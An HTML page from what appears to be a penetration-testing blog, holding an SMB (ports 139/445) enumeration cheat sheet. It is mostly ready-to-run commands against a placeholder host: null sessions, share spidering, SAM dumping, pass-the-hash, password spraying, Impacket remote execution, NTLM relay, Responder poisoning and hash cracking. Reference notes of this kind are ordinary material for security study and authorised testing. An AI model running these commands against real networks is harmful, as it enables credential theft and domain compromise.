@@ -1,0 +1,326 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="SMB-Enumeration-Ports-139-445"><a href="#SMB-Enumeration-Ports-139-445" class="headerlink" title="SMB Enumeration (Ports 139, 445)"></a>SMB Enumeration (Ports 139, 445)</h1><p>Enumerate SMB shares, users, and configurations to identify sensitive files and potential attack vectors.<br>SMB is critical in Windows environments and often contains credentials, configuration files, and paths to privilege escalation.</p>
+<h2 id="Quick-Reference"><a href="#Quick-Reference" class="headerlink" title="Quick Reference"></a>Quick Reference</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check for null session</span></span><br><span class="line">smbclient -N -L //10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># List shares with credentials</span></span><br><span class="line">smbclient -L //10.10.10.10 -U username</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enumerate with NetExec</span></span><br><span class="line">nxc smb 10.10.10.10 -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --shares</span><br><span class="line"></span><br><span class="line"><span class="comment"># Spider all shares</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password -M spider_plus</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMB-Ports"><a href="#SMB-Ports" class="headerlink" title="SMB Ports"></a>SMB Ports</h2><ul>
+<li><strong>Port 139</strong>: SMB over NetBIOS</li>
+<li><strong>Port 445</strong>: SMB directly over TCP&#x2F;IP</li>
+<li><strong>UDP 137-138</strong>: NetBIOS Name Service</li>
+</ul>
+<h2 id="Null-Session-Enumeration"><a href="#Null-Session-Enumeration" class="headerlink" title="Null Session Enumeration"></a>Null Session Enumeration</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SMBClient null session</span></span><br><span class="line">smbclient -N -L //10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># NetExec null session</span></span><br><span class="line">nxc smb 10.10.10.10 -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --shares</span><br><span class="line">nxc smb 10.10.10.10 -u <span class="string">&#x27;guest&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --shares</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enum4linux</span></span><br><span class="line">enum4linux -a 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># RPCClient null session</span></span><br><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h2 id="NetExec-Enumeration"><a href="#NetExec-Enumeration" class="headerlink" title="NetExec  Enumeration"></a>NetExec  Enumeration</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Basic enumeration</span></span><br><span class="line">nxc smb 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># List shares</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password --shares</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enumerate users</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password --<span class="built_in">users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enumerate groups</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password --<span class="built_in">groups</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enumerate logged-on users</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password --loggedon-users</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enumerate local groups</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password --local-groups</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for admin access</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password</span><br><span class="line"></span><br><span class="line"><span class="comment"># Spider shares</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password -M spider_plus --share <span class="string">&#x27;ShareName&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get file from share</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password --get-file <span class="string">&#x27;\\Windows\\Temp\\file.txt&#x27;</span> ./file.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Execute command</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password -x <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump SAM</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password --sam</span><br><span class="line"></span><br><span class="line"><span class="comment"># Pass-the-hash</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -H NTHASH</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMBClient"><a href="#SMBClient" class="headerlink" title="SMBClient"></a>SMBClient</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># List shares</span></span><br><span class="line">smbclient -L //10.10.10.10 -U username</span><br><span class="line"></span><br><span class="line"><span class="comment"># Connect to share</span></span><br><span class="line">smbclient //10.10.10.10/ShareName -U username</span><br><span class="line"></span><br><span class="line"><span class="comment"># Connect with null session</span></span><br><span class="line">smbclient //10.10.10.10/IPC$ -N</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download file</span></span><br><span class="line">smbclient //10.10.10.10/Share -U username -c <span class="string">&#x27;get file.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload file</span></span><br><span class="line">smbclient //10.10.10.10/Share -U username -c <span class="string">&#x27;put file.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Recursive listing</span></span><br><span class="line">smbclient //10.10.10.10/Share -U username -c <span class="string">&#x27;recurse;ls&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="SMBMap"><a href="#SMBMap" class="headerlink" title="SMBMap"></a>SMBMap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># List shares</span></span><br><span class="line">smbmap -H 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># With credentials</span></span><br><span class="line">smbmap -u username -p password -H 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Recursive listing</span></span><br><span class="line">smbmap -u username -p password -H 10.10.10.10 -R ShareName</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download file</span></span><br><span class="line">smbmap -u username -p password -H 10.10.10.10 --download <span class="string">&#x27;ShareName\file.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload file</span></span><br><span class="line">smbmap -u username -p password -H 10.10.10.10 --upload <span class="string">&#x27;file.txt&#x27;</span> <span class="string">&#x27;ShareName\file.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Execute command</span></span><br><span class="line">smbmap -u username -p password -H 10.10.10.10 -x <span class="string">&#x27;ipconfig&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Nmap-NSE-Scripts"><a href="#Nmap-NSE-Scripts" class="headerlink" title="Nmap NSE Scripts"></a>Nmap NSE Scripts</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SMB enumeration</span></span><br><span class="line">nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB vulnerabilities</span></span><br><span class="line">nmap -p 445 --script smb-vuln* 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Specific vulnerabilities</span></span><br><span class="line">nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10  <span class="comment"># EternalBlue</span></span><br><span class="line">nmap -p 445 --script smb-vuln-ms08-067 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB security mode</span></span><br><span class="line">nmap -p 445 --script smb-security-mode 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB2 capabilities</span></span><br><span class="line">nmap -p 445 --script smb2-capabilities,smb2-security-mode 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h2 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Domain-joined hosts</span></span><br><span class="line">nxc smb 10.10.10.10 -u users.txt -p <span class="string">&#x27;Password123!&#x27;</span> -d domain.local --continue-on-success</span><br><span class="line"></span><br><span class="line"><span class="comment"># Local authentication</span></span><br><span class="line">nxc smb 10.10.10.10 -u users.txt -p <span class="string">&#x27;Password123!&#x27;</span> --local-auth --continue-on-success</span><br><span class="line"></span><br><span class="line"><span class="comment"># Subnet spray</span></span><br><span class="line">nxc smb 10.10.10.0/24 -u administrator -p <span class="string">&#x27;Password123!&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Mounting-SMB-Shares"><a href="#Mounting-SMB-Shares" class="headerlink" title="Mounting SMB Shares"></a>Mounting SMB Shares</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create mount point</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> /mnt/smb_share</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mount with credentials</span></span><br><span class="line"><span class="built_in">sudo</span> mount -t cifs -o username=user,password=pass //10.10.10.10/Share /mnt/smb_share</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mount with credential file</span></span><br><span class="line"><span class="built_in">sudo</span> mount -t cifs -o credentials=/path/to/creds //10.10.10.10/Share /mnt/smb_share</span><br><span class="line"></span><br><span class="line"><span class="comment"># Credential file format:</span></span><br><span class="line"><span class="comment"># username=user</span></span><br><span class="line"><span class="comment"># password=pass</span></span><br><span class="line"><span class="comment"># domain=.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unmount</span></span><br><span class="line"><span class="built_in">sudo</span> umount /mnt/smb_share</span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Map network drive</span><br><span class="line"><span class="built_in">net</span> use Z: \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>\Share</span><br><span class="line"></span><br><span class="line"># With credentials</span><br><span class="line"><span class="built_in">net</span> use Z: \\<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>\Share /user:username password</span><br><span class="line"></span><br><span class="line"># View mapped drives</span><br><span class="line"><span class="built_in">net</span> use</span><br><span class="line"></span><br><span class="line"># Disconnect</span><br><span class="line"><span class="built_in">net</span> use Z: /delete</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PowerShell mount</span></span><br><span class="line"><span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">&quot;Z&quot;</span> <span class="literal">-Root</span> <span class="string">&quot;\\10.10.10.10\Share&quot;</span> <span class="literal">-PSProvider</span> <span class="string">&quot;FileSystem&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With credentials</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;username&#x27;</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;password&#x27;</span></span><br><span class="line"><span class="variable">$secpassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$secpassword</span></span><br><span class="line"><span class="built_in">New-PSDrive</span> <span class="literal">-Name</span> <span class="string">&quot;Z&quot;</span> <span class="literal">-Root</span> <span class="string">&quot;\\10.10.10.10\Share&quot;</span> <span class="literal">-PSProvider</span> <span class="string">&quot;FileSystem&quot;</span> <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Searching-for-Sensitive-Files"><a href="#Searching-for-Sensitive-Files" class="headerlink" title="Searching for Sensitive Files"></a>Searching for Sensitive Files</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Search for files containing &quot;password&quot;</span></span><br><span class="line">grep -rn /mnt/smb_share/ -ie <span class="string">&quot;password&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Search for specific filenames</span></span><br><span class="line">find /mnt/smb_share/ -name <span class="string">&quot;*cred*&quot;</span></span><br><span class="line">find /mnt/smb_share/ -name <span class="string">&quot;*.config&quot;</span></span><br><span class="line">find /mnt/smb_share/ -name <span class="string">&quot;*.xml&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Search <span class="keyword">for</span> files containing keywords</span><br><span class="line"><span class="built_in">findstr</span> /s /i /n /c:&quot;password&quot; /c:&quot;credential&quot; Z:\* &gt; results.txt</span><br><span class="line"></span><br><span class="line"># PowerShell search</span><br><span class="line">Get-ChildItem -Recurse -<span class="built_in">Path</span> Z:\ -Include *cred* -File</span><br><span class="line">Get-ChildItem -Recurse -<span class="built_in">Path</span> Z:\ | Select-String &quot;password&quot; -List</span><br></pre></td></tr></table></figure>
+
+<h2 id="Remote-Command-Execution"><a href="#Remote-Command-Execution" class="headerlink" title="Remote Command Execution"></a>Remote Command Execution</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Impacket psexec</span></span><br><span class="line">impacket-psexec username:password@10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Impacket smbexec</span></span><br><span class="line">impacket-smbexec username:password@10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Impacket wmiexec</span></span><br><span class="line">impacket-wmiexec username:password@10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># NetExec</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password -x <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password --exec-method smbexec -x <span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="NTLM-Relay-Attack"><a href="#NTLM-Relay-Attack" class="headerlink" title="NTLM Relay Attack"></a>NTLM Relay Attack</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Disable SMB in Responder</span></span><br><span class="line"><span class="built_in">cat</span> /etc/responder/Responder.conf | grep <span class="string">&#x27;SMB =&#x27;</span></span><br><span class="line"><span class="comment"># Set: SMB = Off</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start ntlmrelayx</span></span><br><span class="line">impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># With command execution</span></span><br><span class="line">impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10 -c <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump SAM</span></span><br><span class="line">impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h2 id="Responder-LLMNR-NBT-NS-Poisoning"><a href="#Responder-LLMNR-NBT-NS-Poisoning" class="headerlink" title="Responder (LLMNR&#x2F;NBT-NS Poisoning)"></a>Responder (LLMNR&#x2F;NBT-NS Poisoning)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Start Responder</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Analyze mode (no poisoning)</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0 -A</span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack captured hash</span></span><br><span class="line">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Common-Workflow"><a href="#Common-Workflow" class="headerlink" title="Common Workflow"></a>Common Workflow</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Check for null session</span></span><br><span class="line">smbclient -N -L //10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Enumerate shares</span></span><br><span class="line">nxc smb 10.10.10.10 -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --shares</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: If credentials available, spider shares</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password -M spider_plus</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Mount interesting shares</span></span><br><span class="line"><span class="built_in">sudo</span> mount -t cifs -o username=user,password=pass //10.10.10.10/Share /mnt/smb</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Search for sensitive files</span></span><br><span class="line">grep -rn /mnt/smb/ -ie <span class="string">&quot;password&quot;</span></span><br><span class="line">find /mnt/smb/ -name <span class="string">&quot;*cred*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 6: Check for vulnerabilities</span></span><br><span class="line">nmap -p 445 --script smb-vuln* 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p><strong>SMB Versions:</strong></p>
+<ul>
+<li>SMB1: Legacy, vulnerable (MS17-010&#x2F;EternalBlue)</li>
+<li>SMB2: Windows Vista&#x2F;Server 2008+</li>
+<li>SMB3: Windows 8&#x2F;Server 2012+, encrypted</li>
+</ul>
+<p><strong>Common Shares:</strong></p>
+<ul>
+<li><code>C$</code>: Administrative share (C: drive)</li>
+<li><code>ADMIN$</code>: Windows installation directory</li>
+<li><code>IPC$</code>: Inter-Process Communication (null session)</li>
+<li><code>SYSVOL</code>: Domain Group Policy (Domain Controllers)</li>
+<li><code>NETLOGON</code>: Logon scripts (Domain Controllers)</li>
+</ul>
+<p><strong>Null Session:</strong><br>Allows anonymous connection to IPC$ share. Can enumerate:</p>
+<ul>
+<li>Users and groups</li>
+<li>Shares</li>
+<li>Domain information</li>
+<li>Password policies</li>
+</ul>
+<p><strong>SMB Signing:</strong></p>
+<ul>
+<li><strong>Enabled</strong>: Prevents NTLM relay attacks</li>
+<li><strong>Disabled</strong>: Vulnerable to NTLM relay</li>
+<li>Check with: <code>nmap -p 445 --script smb-security-mode 10.10.10.10</code></li>
+</ul>
+<p><strong>Critical Vulnerabilities:</strong></p>
+<ul>
+<li><strong>MS17-010 (EternalBlue)</strong>: RCE on SMB1</li>
+<li><strong>MS08-067</strong>: RCE on Windows XP&#x2F;2003</li>
+<li><strong>SMBGhost (CVE-2020-0796)</strong>: RCE on SMBv3</li>
+<li><strong>ZeroLogon (CVE-2020-1472)</strong>: Domain takeover</li>
+</ul>
+<p><strong>Sensitive Files to Look For:</strong></p>
+<ul>
+<li><code>web.config</code>: Database credentials</li>
+<li><code>*.xml</code>: Configuration files</li>
+<li><code>*.ini</code>: Application settings</li>
+<li><code>*.config</code>: Various credentials</li>
+<li><code>Groups.xml</code>: GPP passwords (SYSVOL)</li>
+<li><code>*.kdbx</code>: KeePass databases</li>
+<li><code>*.rdp</code>: RDP connection files</li>
+<li><code>*.txt</code>: Notes, passwords</li>
+<li><code>*.sql</code>: Database dumps</li>
+</ul>
+<p><strong>Spider Plus Module:</strong><br>NetExec’s spider_plus module output: <code>/tmp/cme_spider_plus/</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># View results</span></span><br><span class="line"><span class="built_in">cat</span> /tmp/cme_spider_plus/*.json | jq .</span><br></pre></td></tr></table></figure>
+
+<p><strong>GPP Passwords:</strong><br>Group Policy Preferences can contain encrypted passwords in SYSVOL:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Find Groups.xml</span></span><br><span class="line">find /mnt/sysvol -name <span class="string">&quot;Groups.xml&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt with gpp-decrypt</span></span><br><span class="line">gpp-decrypt &lt;encrypted_password&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Pass-the-Hash:</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NetExec</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -H NTHASH</span><br><span class="line"></span><br><span class="line"><span class="comment"># Impacket</span></span><br><span class="line">impacket-psexec -hashes :NTHASH username@10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<p><strong>SMB Relay Requirements:</strong></p>
+<ul>
+<li>SMB signing disabled on target</li>
+<li>Valid credentials captured</li>
+<li>User has admin rights on target</li>
+</ul>
+<p><strong>Best Practices:</strong></p>
+<ul>
+<li>Always check for null sessions first</li>
+<li>Enumerate users before password spraying</li>
+<li>Look for SYSVOL&#x2F;NETLOGON on Domain Controllers</li>
+<li>Check for SMB signing status</li>
+<li>Test for EternalBlue on older systems</li>
+<li>Search for GPP passwords</li>
+<li>Look for backup files and database dumps</li>
+<li>Check file timestamps for recent activity</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
